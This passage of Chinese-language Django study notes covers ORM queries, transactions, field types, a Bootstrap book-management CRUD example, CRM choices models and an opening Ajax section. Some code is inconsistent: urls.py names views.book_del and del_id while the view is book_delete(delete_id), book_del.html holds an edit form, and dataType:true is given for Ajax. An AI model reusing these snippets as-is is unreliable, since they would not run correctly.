# 2，将所有书籍的提升50元
res = models.Book.objects.update(price=F('price') + 50)
print(res)

## 3,将所有书的名称后面加上爆款两个字
from django.db.models.functions import Concat
from django.db.models import Value
'''
在操作字符类型的数据的时候，F不能直接做到字符串的拼接，没有效果的,需要用以下方法
'''
res = models.Book.objects.update(title=Concat(F('title'),Value('——爆款')))
print(res)
```

### 15-14 Q 查询

```python
## Q 查询
from django.db.models import Q
## 1，查询卖出书大于100或者价格小于600的书籍
res = models.Book.objects.filter(maichu__gt=100,price__lt=600)
## filter括号内多个参数是and 关系,逗号分割
print(res)

res = models.Book.objects.filter(Q(maichu__gt=100) | Q(price__lt= 600))
'''
或  |
非  ~  
res = models.Book.objects.filter(~Q(maichu__gt=100) | ~Q(price__lt= 600))
'''
print(res)

## Q 的高阶用法 可以把查询条件的左边也可以改成字符串的形式
q = Q()
q.connector = 'or' ## 可以改默认的and连接关系 
q.children.append(('maichu__gt',100))
q.children.append(('price__lt',600))
res = models.Book.objects.filter(q) ## filter括号内支持直接放Q对象，默认还是and关系
print(res)

```

### 15-15 Django中开启事务

```python
"""
事务
	ACID
		原子性
			不可分割的最小单位
		一致性
			跟原子性是相辅相成
		隔离性
			事务之间互相不干扰
		持久性
			事务一旦确认永久生效
	
	事务的回滚 
		rollback
	事务的确认
		commit
"""
# 目前你只需要掌握Django中如何简单的开启事务
# 事务
    from django.db import transaction
    try:
        with transaction.atomic():
            # sql1
            # sql2
            ...
            # 在with代码快内书写的所有orm操作都是属于同一个事务
    except Exception as e:
        print(e)
    print('执行其他操作')
```

### 15 -16 ORM中常用字段及参数

```python
AutoField
	主键字段 primary_key=True
  
CharField				varchar
	verbose_name	字段的注释
     max_length		长度
  
IntegerField			int
BigIntegerField		  bigint

DecimalField
	max_digits=8
     decimal_places=2

EmailFiled				varchar(254)

DateField					date
DateTimeField			datetime
  auto_now: ## 每次修改数据的时候都会自动更新当前时间
  auto_now_add: ## 只在创建数据的时候记录创建时间后续不会自动修改了
    
BooleanField(Field)				- 布尔值类型
	该字段传布尔值(False/True) 	数据库里面存0/1

TextField(Field)					- 文本类型
	该字段可以用来存大段内容(文章、博客...)  没有字数限制
  后面的bbs作业 文章字段用的就是TextField


FileField(Field)					- 字符类型
   upload_to = "/data"
  给该字段传一个文件对象，会自动将文件保存到/data目录下然后将文件路径保存到数据库中
  /data/a.txt
  后面bbs作业也会涉及

# 更多字段
直接参考博客:https://www.cnblogs.com/Dominic-Ji/p/9203990.html

    
# django除了给你提供了很多字段类型之外 还支持你自定义字段
class MyCharField(models.Field):
    def __init__(self,max_length,*args,**kwargs):
        self.max_length = max_length
        # 调用父类的init方法
        super().__init__(max_length=max_length,*args,**kwargs)  # 一定要是关键字的形式传入

    def db_type(self, connection):
        """
        返回真正的数据类型及各种约束条件
        :param connection:
        :return:
        """
        return 'char(%s)'%self.max_length

# 自定义字段使用
myfield = MyCharField(max_length=16,null=True)



# 外键字段及参数
unique=True
	ForeignKey(unique=True)   ===			OneToOneField()
  # 你在用前面字段创建一对一 orm会有一个提示信息 orm推荐你使用后者但是前者也能用
  
db_index
	## 如果db_index=True 则代表着为此字段设置索引

to_field
	## 设置要关联的表的字段  默认不写关联的就是另外一张的主键字段

on_delete
	## 当删除关联表中的数据时，当前表与其关联的行的行为。
  """
  django2.X及以上版本 需要你自己指定外键字段的级联更新级联删除
  """
```

### 15-16 数据库查询优化

```python
only与defer	
select_related与prefetch_related

"""
orm语句的特点:
	惰性查询
		如果你仅仅只是书写了orm语句 在后面根本没有用到该语句所查询出来的参数
		那么orm会自动识别 直接不执行
"""
# only与defer
# res = models.Book.objects.all()
    # print(res)  # 要用数据了才会走数据库

    # 想要获取书籍表中所有数的名字
    # res = models.Book.objects.values('title')
    # for d in res:
    #     print(d.get('title'))
    # 你给我实现获取到的是一个数据对象 然后点title就能够拿到书名 并且没有其他字段
    # res = models.Book.objects.only('title')
    # res = models.Book.objects.all()
    # print(res)  # <QuerySet [<Book: 三国演义爆款>, <Book: 红楼梦爆款>, <Book: 论语爆款>, <Book: 聊斋爆款>, <Book: 老子爆款>]>
    # for i in res:
        # print(i.title)  # 点击only括号内的字段 不会走数据库
        # print(i.price)  # 点击only括号内没有的字段 会重新走数据库查询而all不需要走了

    res = models.Book.objects.defer('title')  # 对象除了没有title属性之外其他的都有
    for i in res:
        print(i.price)
    """
    defer与only刚好相反
        defer括号内放的字段不在查询出来的对象里面 查询该字段需要重新走数据
        而如果查询的是非括号内的字段 则不需要走数据库了

    """
    

# select_related与prefetch_related
# select_related与prefetch_related  跟跨表操作有关
    # res = models.Book.objects.all()
    # for i in res:
    #     print(i.publish.name)  # 每循环一次就要走一次数据库查询

    # res = models.Book.objects.select_related('authors')  # INNER JOIN
    """
    select_related内部直接先将book与publish连起来 然后一次性将大表里面的所有数据
    全部封装给查询出来的对象
        这个时候对象无论是点击book表的数据还是publish的数据都无需再走数据库查询了
    
    select_related括号内只能放外键字段    一对多 一对一
        多对多也不行
    
    """
    # for i in res:
    #     print(i.publish.name)  # 每循环一次就要走一次数据库查询

    res = models.Book.objects.prefetch_related('publish')  # 子查询
    """
    prefetch_related该方法内部其实就是子查询
        将子查询查询出来的所有结果也给你封装到对象中
        给你的感觉好像也是一次性搞定的
    """
    for i in res:
        print(i.publish.name)
```

### 15-17 图书馆里系统的增删改查

#### 17-1 models.py

```python
from django.db import models

# Create your models here.
from django.db import models

# Create your models here.

class Book(models.Model):
	title = models.CharField(max_length=32)
	price = models.DecimalField(max_digits=8,decimal_places=2)
	publish_date = models.DateField(auto_now_add=True)


	## 一对多
	publish = models.ForeignKey(to='Publish')
	## 多对多
	authors = models.ManyToManyField(to='Author')

	def __str__(self):
		return self.title


class Publish(models.Model):
	name = models.CharField(max_length=32)
	addr = models.CharField(max_length=64)
	email = models.EmailField() ## 本质是varchar

	def __str__(self):
		return '对象：%s'%self.name

class Author(models.Model):
	name = models.CharField(max_length=32)
	age = models.IntegerField()

	## 一对一
	author_detail = models.OneToOneField(to='AuthorDetail')

class AuthorDetail(models.Model):
	phone = models.BigIntegerField()
	addr = models.CharField(max_length=64)



```

#### 17-2 views.py

```python
from django.shortcuts import render,redirect,HttpResponse
from app01 import models
# Create your views here.

def home(request):
    return render(request,'home.html')


def book_list(request):
    # 先查询出所有的书籍信息 传递给html页面
    book_queryset = models.Book.objects.all()
    return render(request,'book_list.html',locals())


def book_add(request):
    if request.method == 'POST':
        # 获取前端提交过来的所有数据
        title = request.POST.get("title")
        price = request.POST.get("price")
        publish_date = request.POST.get("publish_date")
        publish_id = request.POST.get("publish")
        authors_list = request.POST.getlist("authors")  # [1,2,3,4,]
        # 操作数据库存储数据
        # 书籍表
        book_obj = models.Book.objects.create(title=title,price=price,publish_date=publish_date,publish_id=publish_id)
        # 书籍与作者的关系表
        book_obj.authors.add(*authors_list)
        # 跳转到书籍的展示页面
        """
        redirect括号内可以直接写url
        其实也可以直接写别名
        
        但是如果你的别名需要额外给参数的话，那么就必须使用reverse解析了
        """
        return redirect('book_list')


    # 先获取当前系统中所有的出版社信息和作者信息
    publish_queryset = models.Publish.objects.all()
    author_queryset = models.Author.objects.all()
    return render(request,'book_add.html',locals())


def book_edit(request,edit_id):
    # 获取当前用户想要编辑的书籍对象 展示给用户看
    edit_obj = models.Book.objects.filter(pk=edit_id).first()
    if request.method == 'POST':
        title = request.POST.get("title")
        price = request.POST.get("price")
        publish_date = request.POST.get("publish_date")
        publish_id = request.POST.get("publish")
        authors_list = request.POST.getlist("authors")  # [1,2,3,4,]
        models.Book.objects.filter(pk=edit_id).update(title=title,
                                                      price=price,
                                                      publish_date=publish_date,
                                                      publish_id=publish_id
                                                      )
        # 该第三张关系表
        edit_obj.authors.set(authors_list)
        return redirect('book_list')

    publish_queryset = models.Publish.objects.all()
    author_queryset = models.Author.objects.all()
    return render(request,'book_edit.html',locals())


def book_delete(request,delete_id):
    # 简单粗暴 直接删除
    models.Book.objects.filter(pk=delete_id).delete()
    # 直接跳转到展示页
    return redirect('book_list')
```

#### 17-3 urls.py

```python
from django.conf.urls import url
from django.contrib import admin
from app01 import views

urlpatterns = [
    url(r'^admin/', admin.site.urls),
    ## 首页
    url(r'^$',views.home,name='home'),
    ## 图书的展示页
    url(r'^book/list',views.book_list,name='book_list'),
    ## 书籍的添加
    url(r'^book/add',views.book_add,name='book_add'),
    ## 编辑页面的URL
    url(r'^book/edit/(?P<edit_id>\d+)',views.book_edit,name='book_edit'),
    ## 书籍的删除
    url(r'^book/del/(?P<del_id>\d+)',views.book_del,name='book_del')
]
```

#### 17-4 home.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css"
          integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap-theme.min.css"
          integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js"
            integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"
            crossorigin="anonymous"></script>
    {% block css %}
        
    
    {% endblock %}
</head>
<body>
<nav class="navbar navbar-inverse">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse"
                    data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="#">图书馆里系统</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav">
                <li class="active"><a href="#">图书<span class="sr-only">(current)</span></a></li>
                <li><a href="#">作者</a></li>
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true"
                       aria-expanded="false">更多<span class="caret"></span></a>
                    <ul class="dropdown-menu">
                        <li><a href="#">Action</a></li>
                        <li><a href="#">Another action</a></li>
                        <li><a href="#">Something else here</a></li>
                        <li role="separator" class="divider"></li>
                        <li><a href="#">Separated link</a></li>
                        <li role="separator" class="divider"></li>
                        <li><a href="#">One more separated link</a></li>
                    </ul>
                </li>
            </ul>
            <form class="navbar-form navbar-left">
                <div class="form-group">
                    <input type="text" class="form-control" placeholder="Search">
                </div>
                <button type="submit" class="btn btn-default">Submit</button>
            </form>
            <ul class="nav navbar-nav navbar-right">
                <li><a href="#">Aini</a></li>
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true"
                       aria-expanded="false">更多操作<span class="caret"></span></a>
                    <ul class="dropdown-menu">
                        <li><a href="#">Action</a></li>
                        <li><a href="#">Another action</a></li>
                        <li><a href="#">Something else here</a></li>
                        <li role="separator" class="divider"></li>
                        <li><a href="#">Separated link</a></li>
                    </ul>
                </li>
            </ul>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container-fluid -->
</nav>
<div class="container-fluid">
    <div class="row">
        <div class="col-md-3">
            <div class="list-group">
                <a href="#" class="list-group-item active">
                    首页
                </a>
                <a href="{% url 'book_list' %}" class="list-group-item">图书列表</a>
                <a href="#" class="list-group-item">出版社列表</a>
                <a href="#" class="list-group-item">作者列表</a>
                <a href="#" class="list-group-item">更多</a>
            </div>
        </div>
        <div class="col-md-9">
            <div class="panel panel-primary">
                <div class="panel-heading">
                    <h3 class="panel-title">BMS</h3>
                </div>
                <div class="panel-body">
                    {% block content %}
                        <div class="jumbotron">
                            <h1>欢迎来到亚洲最大线上读书平台</h1>
                            <p>想看啥书都有</p>
                            <p><a class="btn btn-primary btn-lg" href="#" role="button">点击有你好看</a></p>
                        </div>
                        <div class="row">
                            <div class="col-sm-6 col-md-4">
                                <div class="thumbnail">
                                    <img src="https://img0.baidu.com/it/u=1226012578,3631571194&fm=253&app=120&size=w931&n=0&f=JPEG&fmt=auto?sec=1696438800&t=a213a0fb1c8620edcd1af5f2bebd341b"
                                         alt="...">
                                    <div class="caption">
                                        <h3>Thumbnail label</h3>
                                        <p>...</p>
                                        <p>
                                            <a href="#" class="btn btn-primary" role="button">Button</a>
                                            <a href="#" class="btn btn-default" role="button">Button</a>
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6 col-md-4">
                                <div class="thumbnail">
                                    <img src="https://img0.baidu.com/it/u=1226012578,3631571194&fm=253&app=120&size=w931&n=0&f=JPEG&fmt=auto?sec=1696438800&t=a213a0fb1c8620edcd1af5f2bebd341b"
                                         alt="...">
                                    <div class="caption">
                                        <h3>Thumbnail label</h3>
                                        <p>...</p>
                                        <p>
                                            <a href="#" class="btn btn-primary" role="button">Button</a>
                                            <a href="#" class="btn btn-default" role="button">Button</a>
                                        </p>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6 col-md-4">
                                <div class="thumbnail">
                                    <img src="https://img0.baidu.com/it/u=1226012578,3631571194&fm=253&app=120&size=w931&n=0&f=JPEG&fmt=auto?sec=1696438800&t=a213a0fb1c8620edcd1af5f2bebd341b"
                                         alt="...">
                                    <div class="caption">
                                        <h3>Thumbnail label</h3>
                                        <p>...</p>
                                        <p>
                                            <a href="#" class="btn btn-primary" role="button">Button</a>
                                            <a href="#" class="btn btn-default" role="button">Button</a>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    {% endblock %}

                </div>
            </div>

        </div>
    </div>
</div>
{% block js %}

{% endblock %}
</body>
</html>
```

#### 17-5 book_list.html

```html
{% extends 'home.html' %}
{% block content %}
    <a href="{% url 'book_add' %}" class="btn btn-success">添加</a>
    </br>
    </br>
    <table class="border table-hover table-striped table-bordered" style="width:100%;text-align:center;">
        <thead>
        <tr>
            <th style="text-align:center;">ID</th>
            <th style="text-align:center;">书名</th>
            <th style="text-align:center;">价格</th>
            <th style="text-align:center;">出版日期</th>
            <th style="text-align:center;">出版社</th>
            <th style="text-align:center;">作者</th>
            <th style="text-align:center;">操作</th>
        </tr>
        </thead>
        <tbody>
        {% for book_obj in book_queryset %}
            <tr>
                <td style="padding:10px 20px;">{{ book_obj.pk }}</td>
                <td style="padding:10px 20px;">{{ book_obj.title }}</td>
                <td style="padding:10px 20px;">{{ book_obj.price }}</td>
                <td style="padding:10px 20px;">{{ book_obj.publish_date | date:'Y-m-d' }}</td>
                <td style="padding:10px 20px;">{{ book_obj.publish.name }}</td>
                <td style="padding:10px 20px;">
                    {% for item in book_obj.authors.all %}
                        {% if forloop.last %}
                            {{ item.name }}
                        {% else %}
                            {{ item.name }},
                        {% endif %}
                    {% endfor %}

                </td>
                <td style="padding:10px 20px;">
                    <a href="{% url 'book_edit'  book_obj.pk %}" class="btn btn-primary btn-sm">编辑</a>
                    <a href="{% url 'book_del'  book_obj.pk %}" class="btn btn-danger btn-sm">删除</a>
                </td>
            </tr>
        {% endfor %}

        </tbody>
    </table>
{% endblock %}
```

#### 17-6 book_add.html

```html
{%  extends 'home.html' %}
{% block content %}
    <h1 class="text-center">书籍的添加</h1>
    <form action="" method="post">
    <p>书名
        <input type="text" name="title" class="form-control">
    </p>
    <p>价格
        <input type="text" name="price" class="form-control">
    </p>
    <p>出版日期
        <input type="date" name="publish_date" class="form-control">
    </p>
    <p>出版社
        <select name="publish" id="" class="form-control">
            {% for item in publish_queryset %}
                <option value="{{ item.pk }}">{{ item.name }}</option>
            {% endfor %}
        </select>
    </p>
    <p>作者
        <select name="authors" id="" multiple class="form-control">
            {% for item in author_queryset %}
                <option value="{{ item.pk }}">{{ item.name }}</option>
            {% endfor %}
        </select>
    </p>
        <input type="submit" value="新增" class="btn btn-primary btn-block">
    </form>
{% endblock %}
```

#### 17-7 book_del.html

```html
{% extends 'home.html' %}
{% block content %}
    <h1 class="text-center">书籍的编辑</h1>
    <form action="" method="post">
    <p>书名
        <input type="text" name="title" class="form-control" value="{{ edit_obj.title }}">
    </p>
    <p>价格
        <input type="text" name="price" class="form-control"  value="{{ edit_obj.price }}">
    </p>
    <p>出版日期
        <input type="date" name="publish_date" class="form-control" value="{{ edit_obj.publish_date | date:'Y-m-d' }}">
    </p>
    <p>出版社
        <select name="publish" id="" class="form-control">
            {% for item in publish_queryset %}
{#                当前书籍出版社应该默认选中昂#}
                {% if edit_obj.publish == item  %}
                    <option value="{{ item.pk }}" selected>{{ item.name }}</option>
                {% else %}
                    <option value="{{ item.pk }}">{{ item.name }}</option>
                {% endif %}
            {% endfor %}
        </select>
    </p>
    <p>作者
        <select name="authors" id="" multiple class="form-control">
            {% for item in author_queryset %}
                {% if item in edit_obj.authors.all %}
                    <option value="{{ item.pk }}" selected>{{ item.name }}</option>
                {% else %}
                    <option value="{{ item.pk }}">{{ item.name }}</option>
                {% endif %}
            {% endfor %}
        </select>
    </p>
        <input type="submit" value="确定" class="btn btn-warning btn-block">
    </form>
{% endblock %}
```

### 15-18 choices参数

```python
"""
用户表	
	性别
	学历
	工作经验
	是否结婚
	是否生子
	客户来源
	...
针对某个可以列举完全的可能性字段，我们应该如何存储

只要某个字段的可能性是可以列举完全的，那么一般情况下都会采用choices参数
"""
class User(models.Model):
    username = models.CharField(max_length=32)
    age = models.IntegerField()
    # 性别
    gender_choices = (
        (1,'男'),
        (2,'女'),
        (3,'其他'),
    )
    gender = models.IntegerField(choices=gender_choices)
    
    score_choices = (
        ('A','优秀'),
        ('B','良好'),
        ('C','及格'),
        ('D','不合格'),
    )
    # 保证字段类型跟列举出来的元祖第一个数据类型一致即可
    score = models.CharField(choices=score_choices,null=True)
    """
    该gender字段存的还是数字 但是如果存的数字在上面元祖列举的范围之内
    那么可以非常轻松的获取到数字对应的真正的内容
    
    1.gender字段存的数字不在上述元祖列举的范围内容
    2.如果在 如何获取对应的中文信息
    """
    
      
    from app01 import models
    # models.User.objects.create(username='jason',age=18,gender=1)
    # models.User.objects.create(username='egon',age=85,gender=2)
    # models.User.objects.create(username='tank',age=40,gender=3)
    # 存的时候 没有列举出来的数字也能存（范围还是按照字段类型决定）
    # models.User.objects.create(username='tony',age=45,gender=4)

    # 取
    # user_obj = models.User.objects.filter(pk=1).first()
    # print(user_obj.gender)
    # 只要是choices参数的字段 如果你想要获取对应信息 固定写法 get_字段名_display()
    # print(user_obj.get_gender_display())

    user_obj = models.User.objects.filter(pk=4).first()
    # 如果没有对应关系 那么字段是什么还是展示什么
    print(user_obj.get_gender_display())  # 4
    
 
# 实际项目案例
# CRM相关内部表
class School(models.Model):
    """
    校区表
    如：
        北京沙河校区
        上海校区

    """
    title = models.CharField(verbose_name='校区名称', max_length=32)

    def __str__(self):
        return self.title

class Course(models.Model):
    """
    课程表
    如：
        Linux基础
        Linux架构师
        Python自动化开发精英班
        Python自动化开发架构师班
        Python基础班
        go基础班
    """
    name = models.CharField(verbose_name='课程名称', max_length=32)

    def __str__(self):
        return self.name

class Department(models.Model):
    """
    部门表
    市场部     1000
    销售       1001

    """
    title = models.CharField(verbose_name='部门名称', max_length=16)
    code = models.IntegerField(verbose_name='部门编号', unique=True, null=False)

    def __str__(self):
        return self.title

class UserInfo(models.Model):
    """
    员工表
    """

    name = models.CharField(verbose_name='员工姓名', max_length=16)
    email = models.EmailField(verbose_name='邮箱', max_length=64)
    depart = models.ForeignKey(verbose_name='部门', to="Department",to_field="code")
    user=models.OneToOneField("User",default=1)
    def __str__(self):
        return self.name

class ClassList(models.Model):
    """
    班级表
    如：
        Python全栈  面授班  5期  10000  2017-11-11  2018-5-11
    """
    school = models.ForeignKey(verbose_name='校区', to='School')
    course = models.ForeignKey(verbose_name='课程名称', to='Course')
    semester = models.IntegerField(verbose_name="班级(期)")


    price = models.IntegerField(verbose_name="学费")
    start_date = models.DateField(verbose_name="开班日期")
    graduate_date = models.DateField(verbose_name="结业日期", null=True, blank=True)
    memo = models.CharField(verbose_name='说明', max_length=256, blank=True, null=True, )

    teachers = models.ManyToManyField(verbose_name='任课老师', to='UserInfo',limit_choices_to={'depart':1002})
    tutor = models.ForeignKey(verbose_name='班主任', to='UserInfo',related_name="class_list",limit_choices_to={'depart':1006})


    def __str__(self):
        return "{0}({1}期)".format(self.course.name, self.semester)


class Customer(models.Model):
    """
    客户表
    """
    qq = models.CharField(verbose_name='qq', max_length=64, unique=True, help_text='QQ号必须唯一')

    name = models.CharField(verbose_name='学生姓名', max_length=16)
    gender_choices = ((1, '男'), (2, '女'))
    gender = models.SmallIntegerField(verbose_name='性别', choices=gender_choices)

    education_choices = (
        (1, '重点大学'),
        (2, '普通本科'),
        (3, '独立院校'),
        (4, '民办本科'),
        (5, '大专'),
        (6, '民办专科'),
        (7, '高中'),
        (8, '其他')
    )
    education = models.IntegerField(verbose_name='学历', choices=education_choices, blank=True, null=True, )
    graduation_school = models.CharField(verbose_name='毕业学校', max_length=64, blank=True, null=True)
    major = models.CharField(verbose_name='所学专业', max_length=64, blank=True, null=True)

    experience_choices = [
        (1, '在校生'),
        (2, '应届毕业'),
        (3, '半年以内'),
        (4, '半年至一年'),
        (5, '一年至三年'),
        (6, '三年至五年'),
        (7, '五年以上'),
    ]
    experience = models.IntegerField(verbose_name='工作经验', blank=True, null=True, choices=experience_choices)
    work_status_choices = [
        (1, '在职'),
        (2, '无业')
    ]
    work_status = models.IntegerField(verbose_name="职业状态", choices=work_status_choices, default=1, blank=True,
                                      null=True)
    company = models.CharField(verbose_name="目前就职公司", max_length=64, blank=True, null=True)
    salary = models.CharField(verbose_name="当前薪资", max_length=64, blank=True, null=True)

    source_choices = [
        (1, "qq群"),
        (2, "内部转介绍"),
        (3, "官方网站"),
        (4, "百度推广"),
        (5, "360推广"),
        (6, "搜狗推广"),
        (7, "腾讯课堂"),
        (8, "广点通"),
        (9, "高校宣讲"),
        (10, "渠道代理"),
        (11, "51cto"),
        (12, "智汇推"),
        (13, "网盟"),
        (14, "DSP"),
        (15, "SEO"),
        (16, "其它"),
    ]
    source = models.SmallIntegerField('客户来源', choices=source_choices, default=1)
    referral_from = models.ForeignKey(
        'self',
        blank=True,
        null=True,
        verbose_name="转介绍自学员",
        help_text="若此客户是转介绍自内部学员,请在此处选择内部学员姓名",
        related_name="internal_referral"
    )
    course = models.ManyToManyField(verbose_name="咨询课程", to="Course")

    status_choices = [
        (1, "已报名"),
        (2, "未报名")
    ]
    status = models.IntegerField(
        verbose_name="状态",
        choices=status_choices,
        default=2,
        help_text=u"选择客户此时的状态"
    )

    consultant = models.ForeignKey(verbose_name="课程顾问", to='UserInfo', related_name='consultanter',limit_choices_to={'depart':1001})

    date = models.DateField(verbose_name="咨询日期", auto_now_add=True)
    recv_date = models.DateField(verbose_name="当前课程顾问的接单日期", null=True)
    last_consult_date = models.DateField(verbose_name="最后跟进日期", )

    def __str__(self):
        return self.name

class ConsultRecord(models.Model):
    """
    客户跟进记录
    """
    customer = models.ForeignKey(verbose_name="所咨询客户", to='Customer')
    consultant = models.ForeignKey(verbose_name="跟踪人", to='UserInfo',limit_choices_to={'depart':1001})
    date = models.DateField(verbose_name="跟进日期", auto_now_add=True)
    note = models.TextField(verbose_name="跟进内容...")

    def __str__(self):
        return self.customer.name + ":" + self.consultant.name

class Student(models.Model):
    """
    学生表（已报名）
    """
    customer = models.OneToOneField(verbose_name='客户信息', to='Customer')
    class_list = models.ManyToManyField(verbose_name="已报班级", to='ClassList', blank=True)

    emergency_contract = models.CharField(max_length=32, blank=True, null=True, verbose_name='紧急联系人')
    company = models.CharField(verbose_name='公司', max_length=128, blank=True, null=True)
    location = models.CharField(max_length=64, verbose_name='所在区域', blank=True, null=True)
    position = models.CharField(verbose_name='岗位', max_length=64, blank=True, null=True)
    salary = models.IntegerField(verbose_name='薪资', blank=True, null=True)
    welfare = models.CharField(verbose_name='福利', max_length=256, blank=True, null=True)
    date = models.DateField(verbose_name='入职时间', help_text='格式yyyy-mm-dd', blank=True, null=True)
    memo = models.CharField(verbose_name='备注', max_length=256, blank=True, null=True)

    def __str__(self):
        return self.customer.name

class ClassStudyRecord(models.Model):
    """
    上课记录表 （班级记录）
    """
    class_obj = models.ForeignKey(verbose_name="班级", to="ClassList")
    day_num = models.IntegerField(verbose_name="节次", help_text=u"此处填写第几节课或第几天课程...,必须为数字")
    teacher = models.ForeignKey(verbose_name="讲师", to='UserInfo',limit_choices_to={'depart':1002})
    date = models.DateField(verbose_name="上课日期", auto_now_add=True)

    course_title = models.CharField(verbose_name='本节课程标题', max_length=64, blank=True, null=True)
    course_memo = models.TextField(verbose_name='本节课程内容概要', blank=True, null=True)
    has_homework = models.BooleanField(default=True, verbose_name="本节有作业")
    homework_title = models.CharField(verbose_name='本节作业标题', max_length=64, blank=True, null=True)
    homework_memo = models.TextField(verbose_name='作业描述', max_length=500, blank=True, null=True)
    exam = models.TextField(verbose_name='踩分点', max_length=300, blank=True, null=True)

    def __str__(self):
        return "{0} day{1}".format(self.class_obj, self.day_num)

class StudentStudyRecord(models.Model):
    '''
    学生学习记录
    '''
    classstudyrecord = models.ForeignKey(verbose_name="第几天课程", to="ClassStudyRecord")
    student = models.ForeignKey(verbose_name="学员", to='Student')


    record_choices = (('checked', "已签到"),
                      ('vacate', "请假"),
                      ('late', "迟到"),
                      ('noshow', "缺勤"),
                      ('leave_early', "早退"),
                      )
    record = models.CharField("上课纪录", choices=record_choices, default="checked", max_length=64)
    score_choices = ((100, 'A+'),
                     (90, 'A'),
                     (85, 'B+'),
                     (80, 'B'),
                     (70, 'B-'),
                     (60, 'C+'),
                     (50, 'C'),
                     (40, 'C-'),
                     (0, ' D'),
                     (-1, 'N/A'),
                     (-100, 'COPY'),
                     (-1000, 'FAIL'),
                     )
    score = models.IntegerField("本节成绩", choices=score_choices, default=-1)
    homework_note = models.CharField(verbose_name='作业评语', max_length=255, blank=True, null=True)
    note = models.CharField(verbose_name="备注", max_length=255, blank=True, null=True)

    homework = models.FileField(verbose_name='作业文件', blank=True, null=True, default=None)
    stu_memo = models.TextField(verbose_name='学员备注', blank=True, null=True)
    date = models.DateTimeField(verbose_name='提交作业日期', auto_now_add=True)

    def __str__(self):
        return "{0}-{1}".format(self.classstudyrecord, self.student)
         
"""
chocies参数使用场景是非常广泛的
"""
```

### 15-19 MTV与MVC模型

```python
# MTV:Django号称是MTV模型
M:models
T:templates
V:views
# MVC:其实django本质也是MVC
M:models
V:views
C:controller
  
# vue框架:MVVM模型
```

### 15-20 多对多三种创建方式

```python
# 全自动:利用orm自动帮我们创建第三张关系表
	class Book(models.Model):
        name = models.CharField(max_length=32)
        authors = models.ManyToManyField(to='Author')
	class Author(models.Model):
    	name = models.CharField(max_length=32)
	"""
	优点:代码不需要你写 非常的方便 还支持orm提供操作第三张关系表的方法...
	不足之处:第三张关系表的扩展性极差(没有办法额外添加字段...)
	"""
# 纯手动
	class Book(models.Model):
    	name = models.CharField(max_length=32)
    
	class Author(models.Model):
    	name = models.CharField(max_length=32)
  
  class Book2Author(models.Model):
   	 book_id = models.ForeignKey(to='Book')
     author_id = models.ForeignKey(to='Author')
  '''
  优点:第三张表完全取决于你自己进行额外的扩展
  不足之处:需要写的代码较多，不能够再使用orm提供的简单的方法
  不建议你用该方式
  '''

# 半自动
class Book(models.Model):
    name = models.CharField(max_length=32)
    authors = models.ManyToManyField(to='Author',
                                     through='Book2Author',
                                     through_fields=('book','author')
                                     )
class Author(models.Model):
    name = models.CharField(max_length=32)
    # books = models.ManyToManyField(to='Book',
    #                                  through='Book2Author',
    #                                  through_fields=('author','book')
    #                                  )
class Book2Author(models.Model):
    book = models.ForeignKey(to='Book')
    author = models.ForeignKey(to='Author')

"""
through_fields字段先后顺序
    判断的本质：
        通过第三张表查询对应的表 需要用到哪个字段就把哪个字段放前面
    你也可以简化判断
        当前表是谁 就把对应的关联字段放前面
        
        
半自动:可以使用orm的正反向查询 但是没法使用add,set,remove,clear这四个方法
"""

# 总结:你需要掌握的是全自动和半自动 为了扩展性更高 一般我们都会采用半自动(写代码要给自己留一条后路)
```

## 12-16 Ajax

### 16-1 小例子

```javascript
/*
页面上有三个input框
	在前两个框中输入数字 点击按钮 朝后端发送ajax请求
	后端计算出结果 再返回给前端动态展示的到第三个input框中
	(整个过程页面不准有刷新,也不能在前端计算)
*/
$('#btn').click(function () {
        // 朝后端发送ajax请求
        $.ajax({
            // 1.指定朝哪个后端发送ajax请求
            url:'', // 不写就是朝当前地址提交
            // 2.请求方式
            type:'post',  // 不指定默认就是get 都是小写
            // 3.数据
            {#data:{'username':'jason','password':123},#}
            data:{'i1':$('#d1').val(),'i2':$('#d2').val()},
            // 4.回调函数:当后端给你返回结果的时候会自动触发 args接受后端的返回结果
            success:function (args) {
                {#alert(args)  // 通过DOM操作动态渲染到第三个input里面#}
                {#$('#d3').val(args)#}
                console.log(typeof args)

            }
        })
    })
              
              
/*
针对后端如果是用HttpResponse返回的数据 回调函数不会自动帮你反序列化,需要在前端进行反序化
如果后端直接用的是JsonResponse返回的数据 回调函数会自动帮你反序列化

HttpResponse解决方式
	1.自己在前端利用JSON.parse()
	2.在ajax里面配置一个参数
		dataType:true,   // 数据会自动帮我们反序列化
*/
          
```

### 16-2 前后端传输数据的编码格式

```python
# 我们主要研究post请求数据的编码格式
"""
get请求数据就是直接放在url后面的
url?username=jason&password=123
"""

